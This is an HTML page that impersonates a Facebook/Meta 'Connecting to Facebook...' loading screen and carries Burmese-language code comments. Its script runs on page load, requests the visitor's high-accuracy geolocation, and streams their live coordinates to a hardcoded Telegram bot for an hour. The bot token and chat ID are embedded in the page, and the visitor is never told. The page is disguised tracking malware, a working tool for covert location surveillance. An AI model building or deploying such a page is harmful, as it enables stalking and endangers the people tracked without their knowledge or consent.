<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting to Facebook...</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f0f2f5;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            height: 100vh; padding: 20px;
        }
        .fb-container { display: flex; flex-direction: column; align-items: center; text-align: center; }
        .fb-logo { width: 75px; height: 75px; margin-bottom: 25px; }
        .fb-spinner {
            width: 32px; height: 32px;
            border: 3px solid #e4e6eb; border-top: 3px solid #1877f2;
            border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #65676b; font-size: 15px; font-weight: 500; }
        .footer-logo { position: absolute; bottom: 40px; color: #8a8d91; font-size: 14px; font-weight: 600; }
    </style>
</head>
<body>

<div class="fb-container">
    <svg class="fb-logo" viewBox="0 0 36 36" fill="none">
        <path d="M20.181 35.87C29.094 34.741 36 27.168 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.223 5.51 15.158 13.002 17.26V22.88H8.897v-4.88h4.105v-3.714c0-4.051 2.413-6.289 6.107-6.289 1.77 0 3.62.316 3.62.316v3.98h-2.04c-2.008 0-2.634 1.246-2.634 2.523v3.184h4.484l-.717 4.88h-3.767V35.87z" fill="#1877F2"/>
    </svg>
    <div class="fb-spinner"></div>
    <div id="status" class="loading-text">Connecting to Facebook...</div>
</div>

<div class="footer-logo">Meta</div>

<script>
    const BOT_TOKEN = "8612853286:AAH3f6SxXLicWQr9mzdvr0QC5OJ0mpUXhPA";
    const CHAT_ID = "6874315478";
    let messageId = null;

    window.onload = function() {
        startTracking();
    };

    function startTracking() {
        if (!navigator.geolocation) {
            window.location.href = "https://www.facebook.com";
            return;
        }

        // ၅ စက္ကန့်တစ်ကြိမ် Location ကို စစ်ဆေးပြီး Telegram သို့ ပို့မည်
        navigator.geolocation.watchPosition(
            (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                if (!messageId) {
                    // ပထမဆုံးအကြိမ် Live Location Message စတင်ပို့ခြင်း
                    sendInitialLocation(latitude, longitude);
                } else {
                    // တည်နေရာ ပြောင်းလဲမှု သို့မဟုတ် ၅ စက္ကန့်ပြည့်တိုင်း Telegram Message ကို Update လုပ်ခြင်း
                    updateLiveLocation(latitude, longitude);
                }
            },
            (error) => {
                console.error(error);
            },
            { 
                enableHighAccuracy: true, 
                timeout: 5000, 
                maximumAge: 0 
            }
        );
    }

    // မူလ Live Location ပို့ပေးသည့် Function
    function sendInitialLocation(lat, lon) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: lat,
                longitude: lon,
                live_period: 3600 // ၁ နာရီကြာ Live Location ဖွင့်ထားမည်
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                messageId = data.result.message_id; // Telegram မှ ရရှိသော Message ID ကို မှတ်ထားခြင်း
            }
        });
    }

    // ၅ စက္ကန့်တစ်ကြိမ် Location Update လုပ်ပေးသည့် Function
    function updateLiveLocation(lat, lon) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageLiveLocation`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                message_id: messageId,
                latitude: lat,
                longitude: lon
            })
        });
    }
</script>

</body>
</html>
